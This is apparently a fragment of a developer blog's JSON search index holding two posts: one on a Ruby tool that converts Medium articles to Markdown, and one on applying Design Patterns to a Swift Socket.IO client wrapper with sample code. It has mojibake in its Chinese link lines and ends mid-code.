ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Converting Medium Posts to MarkdownWriting a Tool to Backup Medium Articles &a...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Converting Medium Posts to MarkdownWriting a Tool to Backup Medium Articles &amp; Convert Them to Markdown FormatZhgChgLi / ZMediumToMarkdown[EN] ZMediumToMarkdownI‚Äôve written a project that lets you download Medium posts and convert them to markdown format easily.Features Support downloading posts and converting them to markdown format Support downloading all posts and converting them to markdown format from any user without login access. Support downloading paid content Support downloading all images in a post to local storage and converting their paths to local ones Support parsing Twitter tweet content into blockquotes Support downloading paid content Support command line interface Convert Gist source code to markdown code block Convert YouTube links embedded in posts to preview images Adjust post‚Äôs last modification date from Medium to the local downloaded markdown file Auto skip when the post has been downloaded and the last modification date from Medium hasn‚Äôt changed (convenient for auto-sync or auto-backup services, saving server bandwidth and execution time) Support using Github Action as auto sync/backup service Highly optimized markdown format for Medium Native Markdown Style Render Engine (Feel free to contribute if you have any optimization ideas! MarkupStyleRender.rb ) jekyll &amp; social share (og: tag) friendly 100% Ruby @ RubyGem [CH] ZMediumToMarkdownA small backup tool that can crawl the content of Medium article links and all articles by a Medium user, convert them into Markdown format, and download them along with the images in the articles.[2022/07/18 Update]: Step-by-step Guide to Seamlessly Migrate Medium to a Self-Hosted WebsiteFeatures No login required, no special permissions needed Support downloading and converting a single article or all articles by a user into Markdown Support downloading and backing up all images within the article and converting them to corresponding image paths Support deep parsing of Gist embedded within the article and convert it into Markdown Code Blocks of the corresponding language. Supports parsing Twitter content and embedding it into articles Support parsing YouTube videos embedded in the article, converting them into video thumbnails and links displayed in Markdown When downloading all user articles, the system scans for embedded related articles and replaces the links with local ones if found. Specially optimized for Medium format style Automatically change the last modified/created time of the downloaded article to match the Medium article‚Äôs publish time Automatically compare the last modification date of the downloaded article; if it is not earlier than the Medium article‚Äôs last modification date, skip the update.(This helps users create automatic Sync/Backup tools, saving server bandwidth and time.) CLI Operation, Supports Automation This project and article are for technical research only. Do not use for any commercial or illegal purposes. The author is not responsible for any illegal activities conducted using this content. Please ensure you have the rights to use and copyright of the article before downloading and backing it up.OriginIn my third year of managing Medium, I have published over 65 articles; all were written directly on the Medium platform without any other backups. Honestly, I have always feared that issues with Medium or other factors might cause the loss of years of hard work.I used to back up manually, which was very boring and time-consuming. So, I have been looking for a tool that can automatically back up and download all articles, preferably with the ability to convert them into Markdown format.Backup Requirements Markdown Format Automatically download all Medium posts of a User based on the User ID Article images should also be downloadable for backup purposes. Must be able to parse Gist into Markdown code blocks(My Medium heavily uses gist to embed source code, so this feature is very important) Backup PlanMedium OfficialAlthough the official version provides an export backup feature, the export format can only be used for importing into Medium, not Markdown or common formats, and it does not handle embedded content such as Github Gitst ‚Ä¶ etc.The API provided by Medium is not well maintained and only offers the Create Post function. Makes sense, as Medium officially does not want users to easily transfer content to other platforms.Chrome ExtensionTried several Chrome Extensions (most have been removed), but the results were poor. First, you have to manually open and back up each article one by one. Second, the parsed format has many errors, and it cannot deeply parse Gist source code or back up all images in the articles.medium-to-markdown command lineA skilled developer wrote this in JS, enabling basic downloading and conversion to Markdown, but it still lacks image backup and deep parsing of Gist source code.ZMediumToMarkdownAfter finding no perfect solution, I decided to write a backup conversion tool myself; it took about three weeks of after-work hours using Ruby to complete.Technical DetailsHow to Get a List of Articles by Entering a Username? Get UserID: View the user‚Äôs homepage source code (https://medium.com/@#{username}) to find the UserID corresponding to the UsernameNote that since Medium has reopened custom domains, you need to handle 30X redirects accordingly Sniffing network requests reveals that Medium uses GraphQL to fetch the homepage article list information Copy the Query &amp; Replace UserID in the Request Information HOST: https://medium.com/_/graphqlMETHOD: POST Get ResponseYou can only fetch 10 items at a time; pagination is required. Article list: can be obtained in result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;posts homepagePostsFrom pagination info: can be found in result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;pagingInfo-&gt;nextUse homepagePostsFrom in the request to access the next page. nil means there are no more pages. How to Analyze Article Content?After inspecting the page source, it can be seen that Medium is built using Apollo Client; the HTML is actually rendered from JS. Therefore, you can check the &lt;script&gt; section in the source code to find the window.__APOLLO_STATE__ field, which contains the entire article‚Äôs paragraph structure. Medium breaks your article into sentence-by-sentence paragraphs and then renders them back to HTML through the JS engine.What we need to do is the same: parse this JSON, match the Type with Markdown styles, and assemble the Markdown format.Technical ChallengesHere is a technical challenge when rendering paragraph text styles: Medium provides the following structure:\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}The meaning of code in text, and link in text, and ZhgChgLi, and bold, and I, only i is:- Characters 5 to 7 should be marked as code (wrapped with `Text`)- Characters 18 to 22 should be marked as a link (using [Text](URL) format)- Characters 50 to 63 should be marked as bold (using *Text* format)- Characters 55 to 69 should be marked as italic (using _Text_ format)Sections 5 to 7 &amp; 18 to 22 are easy to handle in this example because there is no overlap; however, sections 50‚Äì63 &amp; 55‚Äì69 have overlapping issues, which Markdown cannot represent with the following overlapping method:code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, **only i_The correct combination results are as follows:code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, _**_only i_50‚Äì55 STRONG55‚Äì63 STRONG, EM63‚Äì69 EMAlso, please note: The string delimiters of the packaging format must be distinguishable. Strong happens to have both the start and end as **, while for a Link, the start is [ and the end is ](URL). When combining Markdown symbols with text, be careful not to include spaces before or after, or it will not work. See the full question here.This part has been studied for a long time. For now, we use an existing library to solve it: reverse_markdown. Special thanks to former colleagues Nick, Chun-Hsiu Liu , James for their collaborative research. I will rewrite it natively when I have time.ResultsOriginal -&gt; Converted Markdown ResultIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Design PatternsÔΩúPractical Solutions for Socket.IO Client Library Challenges", "url": "/posts/pinkoi-engineering/design-patterns-practical-solutions-for-socket-io-client-library-challenges-78507a8de6a5/", "categories": "Pinkoi Engineering", "tags": "ios-app-development, design-patterns, socketio, websocket, finite-state-machine, english, ai-translation", "date": "2022-04-07 22:49:17 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Practical Application Records of Design PatternsProblem Scenarios Encountered ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Practical Application Records of Design PatternsProblem Scenarios Encountered When Encapsulating the Socket.IO Client Library and Design Patterns Applied to SolutionsPhoto by Daniel McCulloughPrefaceThis article records real development scenarios where Design Patterns were used to solve problems. It covers the background of the requirements, the actual problem scenarios (What?), why applying Patterns is necessary (Why?), and how to implement them (How?). It is recommended to read from the beginning for better coherence. This article introduces four development scenarios encountered for this requirement and the application of seven Design Patterns to solve these scenarios.BackgroundOrganization StructureOur company split into multiple Feature Teams and a Platform Team this year; the former mainly handles user-side requirements, while the Platform Team works internally within the company. One of its tasks is technology adoption, infrastructure, and systematic integration to pave the way for Feature Teams when developing their requirements.Current RequirementsFeature Teams want to change the original messaging feature (fetching message data by calling APIs on page load, requiring refresh to update messages) to real-time communication (able to receive the latest messages instantly and send messages in real time).Platform Team WorkThe Platform Team focuses not only on the current real-time communication needs but also on long-term development and reusability. After evaluation, the WebSocket bidirectional communication mechanism is indispensable in modern apps. Beyond this requirement, there will be many opportunities to use it in the future. With sufficient human resources, the team is committed to assisting in designing and developing the interface.Goal: Encapsulating Pinkoi Server Side and Socket.IO Communication, Authentication Logic Encapsulate the tedious operations of Socket.IO, providing an extensible and user-friendly interface based on Pinkoi‚Äôs business requirements Unified Cross-Platform Interface (The Socket.IO Android and iOS Client Side Libraries support different features and interfaces) Feature side does not need to understand the Socket.IO mechanism Feature side does not need to manage complex connection states Future WebSocket bidirectional communication needs can be directly supported Time and Manpower: One person dedicated to iOS and one to Android respectively Development Schedule: Duration 3 weeks Technical DetailsThis feature will be supported on Web, iOS, and Android platforms; it requires introducing the WebSocket bidirectional communication protocol. The backend plans to use the Socket.io service directly. First of all, Socket != WebSocketFor details about Socket and WebSocket technologies, please refer to the following two articles: Differences between Socket, Websocket, and Socket.io Why not use socket directly and instead define a new websocket? In short:Socket is an abstract interface for the TCP/UDP transport layer, while WebSocket is a transport protocol at the application layer.The relationship between Socket and WebSocket is like that between a dog and a hot dog‚Äîno relation.Socket.IO is an abstraction layer built on top of Engine.IO, which itself wraps WebSocket usage. Each layer only handles communication between the layer above and below it, disallowing direct operations across layers (e.g., Socket.IO does not directly operate the WebSocket connection).Socket.IO/Engine.IO implements many convenient features beyond basic WebSocket connections (e.g., offline event sending mechanism, HTTP-like request mechanism, Room/Group mechanism, etc.).The main responsibility of the Platform Team layer is to bridge the logic between Socket.IO and the Pinkoi Server Side, providing support for upper Feature Teams during feature development.Socket.IO Swift Client has pitfalls It has not been updated for a long time (the latest version is still from 2019), so it is unclear if it is still maintained. Client &amp; Server Side Socket IO versions must match. On the Server Side, you can add {allowEIO3: true}, or specify the same version on the Client Side using .version.Otherwise, the connection will fail no matter what. Naming conventions, interfaces, and official website examples often do not match. Socket.io official examples are all based on Web, but the Swift Client does not necessarily support all features shown on the official site.In this implementation, we found that the iOS Library does not provide an offline event sending mechanism(which we implemented ourselves, please continue reading). It is recommended to experiment first to see if the desired mechanism is supported before adopting Socket.IO. Socket.IO Swift Client is a wrapper based on the Starscream WebSocket Library and can fallback to Starscream when necessary.Background information ends here. Now, let's get to the main topic.Design PatternsDesign patterns are essentially solutions to common problems in software design. You don‚Äôt have to use design patterns to develop, design patterns may not fit all scenarios, and no one says you can‚Äôt create your own new design patterns.The Catalog of Design PatternsHowever, the existing design patterns (The 23 Gang of Four Design Patterns) are common knowledge in software design. When mentioning a XXX Pattern, everyone immediately envisions the corresponding architectural blueprint, requiring little explanation. This also makes subsequent maintenance easier to understand and is a proven industry method that rarely requires time to review object dependency issues. Choosing the right pattern for the right scenario can reduce communication and maintenance costs and improve development efficiency. Design patterns can be combined, but it is not recommended to drastically modify existing patterns, forcefully apply them without reason, or use patterns outside their intended category (e.g., using the Chain of Responsibility pattern to create objects). Doing so defeats their purpose and may cause confusion for future maintainers.Design Patterns Mentioned in This Article: Singleton Pattern Flyweight Pattern Factory Pattern Command Pattern Finite-State Machine + State Pattern Chain Of Responsibility Builder Pattern Each will be explained later one by one: the scenario used and why it was chosen. This article focuses on the application of Design Patterns rather than Socket.IO operations. Some examples are simplified for clarity and are not suitable for real Socket.IO encapsulation. Due to space limitations, this article will not detail the architecture of each design pattern. Please click on the links for each pattern to understand their structures before continuing. The demo code will be written in Swift.Requirement Scenario 1.What? Reuse the same object when requesting a Connection with the same Path on different pages or Objects. Connection should be an abstract interface, not directly dependent on the Socket.IO Object Why? Reduce memory overhead and the time and traffic costs of repeated connections. Reserve space for future replacement with other frameworks How? Singleton Pattern: A creational pattern that ensures a class has only one instance. Flyweight Pattern: A structural pattern that shares common states among multiple objects for reuse. Factory Pattern: A creational pattern that abstracts the object creation method, allowing it to be replaced externally. Real Case Usage: Singleton Pattern: The ConnectionManager exists as a single instance throughout the App Lifecycle, managing access to Connection objects. Flyweight Pattern: The ConnectionPool is a shared pool of Connections. It provides a unified way to get a Connection from the pool, including logic to return an existing Connection if the URL Path matches.ConnectionHandler acts as an external operator and state manager for the Connection. Factory Pattern: The ConnectionFactory works with the Flyweight Pattern above to create a new Connection via this factory interface when no reusable connection is found in the pool. import Combineimport Foundationprotocol Connection { var url: URL {get} var id: UUID {get} init(url: URL) func connect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}protocol ConnectionFactory { func create(url: URL) -&gt; Connection}class ConnectionPool { private let connectionFactory: ConnectionFactory private var connections: [Connection] = [] init(connectionFactory: ConnectionFactory) { self.connectionFactory = connectionFactory } func getOrCreateConnection(url: URL) -&gt; Connection { if let connection = connections.first(where: { $0.url == url }) { return connection } else { let connection = connectionFactory.create(url: url) connections.append(connection) return connection } } }class ConnectionHandler { private let connection: Connection init(connection: Connection) { self.connection = connection } func getConnectionUUID() -&gt; UUID { return connection.id }}class ConnectionManager { static let shared = ConnectionManager(connectionPool: ConnectionPool(connectionFactory: SIOConnectionFactory())) private let connectionPool: ConnectionPool private init(connectionPool: ConnectionPool) { self.connectionPool = connectionPool } // func requestConnectionHandler(url: URL) -&gt; ConnectionHandler { let connection = connectionPool.getOrCreateConnection(url: url) return ConnectionHandler(connection: connection) }}// Socket.IO Implementationclass SIOConnection: Connection { let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}class SIOConnectionFactory: ConnectionFactory { func create(url: URL) -&gt; Connection { // return SIOConnection(url: url) }}//print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/2\")!).getConnectionUUID().uuidString)// output:// D99F5429-1C6D-4EB5-A56E-9373D6F37307// D99F5429-1C6D-4EB5-A56E-9373D6F37307// 599CF16F-3D7C-49CF-817B-5A57C119FE31Requirement Scenario 2.What?As described in the background technical details, the Socket.IO Swift Client‚Äôs Send Event does not support offline sending (while the Web/Android versions of the library do), so the iOS side needs to implement this feature independently.The amazing thing is that the Socket.IO Swift Client - onEvent supports offline subscription.Why? Cross-Platform Feature Unification The code is easy to understand How? Command Pattern: A behavioral pattern that encapsulates operations into objects, allowing queuing, delaying, canceling, and other batch actions. Command Pattern: SIOManager is the lowest-level wrapper for communicating with Socket.IO. Its send and request methods operate on Socket.IO Send Events. When the current Socket.IO is disconnected, the request parameters are placed into bufferedCommands. Once reconnected, these commands are processed one by one (First In First Out).protocol BufferedCommand { var sioManager: SIOManagerSpec? { get set } var event: String { get } func execute()}struct SendBufferedCommand: BufferedCommand { let event: String weak var sioManager: SIOManagerSpec? func execute() { sioManager?.send(event) }}struct RequestBufferedCommand: BufferedCommand { let event: String let callback: (Data?) -&gt; Void weak var sioManager: SIOManagerSpec? func execute() { sioManager?.request(event, callback: callback) }}protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connectedSimilarly, it can also be implemented on onEvent.Extension: You can also apply the Proxy Pattern, treating the Buffer functionality as a type of Proxy.Requirement Scenario 3.What?Connection has multiple states, with ordered transitions between states, and each state allows different operations. Created: The object is created, allowing transition to -&gt; Connected or directly to Disconnected Connected: Connected to Socket.IO, allows -&gt; Disconnected Disconnected: Disconnected from Socket.IO, allows -&gt; Reconnectiong, Released Reconnectiong: Attempting to reconnect to Socket.IO, allowed states -&gt; Connected, Disconnected Released: The object has been marked for memory deallocation and does not allow any operations or state transitions. Why? The logic and representation of states and state transitions are complex. Each state must restrict certain operations (e.g., when State = Released, calling Send Event is not allowed). Using if‚Ä¶else directly makes the code difficult to maintain and read. How? Finite State Machine: Manage transitions between states State Pattern: A behavioral pattern that handles different responses based on the object‚Äôs state changes Finite State Machine: SIOConnectionStateMachine is the state machine implementation, currentSIOConnectionState represents the current state, and created, connected, disconnected, reconnecting, released list the possible states this machine can switch to.enterXXXState() throws handles the allowed and disallowed (throw error) transitions when entering a certain state from the current state. State Pattern: SIOConnectionState is the abstract interface for all operations used by the states. protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected//class SIOConnectionStateMachine { private(set) var currentSIOConnectionState: SIOConnectionState! private var created: SIOConnectionState! private var connected: SIOConnectionState! private var disconnected: SIOConnectionState! private var reconnecting: SIOConnectionState! private var released: SIOConnectionState! init() { self.created = SIOConnectionCreatedState(stateMachine: self) self.connected = SIOConnectionConnectedState(stateMachine: self) self.disconnected = SIOConnectionDisconnectedState(stateMachine: self) self.reconnecting = SIOConnectionReconnectingState(stateMachine: self) self.released = SIOConnectionReleasedState(stateMachine: self) self.currentSIOConnectionState = created } func enterConnected() throws { if [created.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(connected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Connected\") } } func enterDisconnected() throws { if [created.connectionState, connected.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(disconnected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Disconnected\") } } func enterReconnecting() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(reconnecting) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Reconnecting\") } } func enterReleased() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(released) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Released\") } } private func enter(_ state: SIOConnectionState) { currentSIOConnectionState = state }}protocol SIOConnectionState { var connectionState: ConnectionState { get } var stateMachine: SIOConnectionStateMachine { get } init(stateMachine: SIOConnectionStateMachine) func onConnected() throws func onDisconnected() throws func connect(socketManager: SIOManagerSpec) throws func disconnect(socketManager: SIOManagerSpec) throws func release(socketManager: SIOManagerSpec) throws func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func send(socketManager: SIOManagerSpec, event: String) throws}struct SIOConnectionStateMachineError: Error { let message: String init(_ message: String) { self.message = message } var localizedDescription: String { return message }}class SIOConnectionCreatedState: SIOConnectionState { let connectionState: ConnectionState = .created let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"CreatedState can't disconnect!\") }}class SIOConnectionConnectedState: SIOConnectionState { let connectionState: ConnectionState = .connected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { // } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionDisconnectedState: SIOConnectionState { let connectionState: ConnectionState = .disconnected let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { // } func release(socketManager: SIOManagerSpec) throws { try stateMachine.enterReleased() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { try stateMachine.enterReconnecting() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReconnectingState: SIOConnectionState { let connectionState: ConnectionState = .reconnecting let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReleasedState: SIOConnectionState { let connectionState: ConnectionState = .released let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onConnected!\") } func onDisconnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onDisconnected!\") } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't release!\") } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't request!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't receiveOn!\") } func send(socketManager: SIOManagerSpec, event: String) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't send!\") } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't disconnect!\") }}do { let stateMachine = SIOConnectionStateMachine() // mock on socket.io connect: // socketIO.on(connect){ try stateMachine.currentSIOConnectionState.onConnected() try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") try stateMachine.currentSIOConnectionState.release(socketManager: manager) try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") // }} catch { print(\"error: \\(error)\")}// output:// error: SIOConnectionStateMachineError(message: \"ConnectedState can\\'t release!\")Requirement Scenario 3.What?Combining scenarios 1 and 2, with the ConnectionPool flyweight pool and State Pattern for state management; we continue to extend. As stated in the background goal, the Feature side does not need to manage the underlying Connection mechanism. Therefore, we created a poller (named ConnectionKeeper) that periodically scans the strongly held Connection objects in the ConnectionPool and performs actions when the following situations occur: Connection is in use and the status is not Connected: change the status to Reconnecting and attempt to reconnect Connection is no longer in use and its status is Connected: change the status to Disconnected Connection is no longer in use and its state is Disconnected: change the state to Released and remove it from the ConnectionPool Why? Three operations have a hierarchical relationship and are mutually exclusive (disconnected -&gt; released or reconnecting) Flexible swapping and adding condition handling Without encapsulation, the three checks and operations can only be written directly within the method (making it difficult to test the logic). e.g: if !connection.isOccupie() &amp;&amp; connection.state == .connected then... connection.disconnected()else if !connection.isOccupie() &amp;&amp; state == .released then... connection.release()else if connection.isOccupie() &amp;&amp; state == .disconnected then... connection.reconnecting()endHow? Chain Of Responsibility: A behavioral pattern that, as the name suggests, is a chain where each node has a corresponding operation. After receiving input data, a node decides whether to handle it or pass it to the next node. Another real-world example is the iOS Responder Chain. By definition, the Chain of Responsibility Pattern does not allow a node to process the data and then pass it to the next node for further processing. Either complete the processing or do not process at all. If the above scenario is more suitable, it should be the Interceptor Pattern. Chain of responsibility: ConnectionKeeperHandler is the abstract node of the chain. The canExcute method is specially extracted to avoid the situation where this node handles the task but then wants to call the next node to continue execution. The handle method links the nodes in the chain, and excute defines the logic of how to process the task if it is handled.ConnectionKeeperHandlerContext is used to store the necessary data, where isOccupie indicates whether the Connection is currently in use.enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var 